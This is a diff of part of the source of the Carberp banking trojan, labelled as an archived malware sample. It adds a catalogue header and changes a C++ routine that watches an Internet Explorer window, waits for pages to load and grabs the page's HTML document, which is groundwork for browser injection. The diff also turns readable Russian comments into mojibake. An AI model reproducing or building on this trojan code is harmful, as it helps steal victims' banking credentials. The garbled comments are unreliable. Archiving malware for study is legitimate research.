@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include "std.h"
 
 void WINAPI WorkingThread(HWND hIE)
@@ -21,7 +32,7 @@ void WINAPI WorkingThread(HWND hIE)
             spBrowser->get_HWND((long*)(&hWnd));
             if ((IsWindow(hWnd)) && (hWnd == hIE))
             {
-                // работать будем пока не закрыто нужное нам окно
+                // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
                 _bstr_t szLocation;
                 while (IsWindow(hWnd))
                 {
@@ -39,7 +50,7 @@ void WINAPI WorkingThread(HWND hIE)
                                 continue;
                             }
                         }
-                        WaitTillLoaded(spBrowser); // дожидаемся загрузки страницы
+                        WaitTillLoaded(spBrowser); // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
                         IHTMLDocument2 *pHTMLDocument=NULL;
                         spBrowser->Document->QueryInterface(IID_IHTMLDocument2,(LPVOID*)&pHTMLDocument);
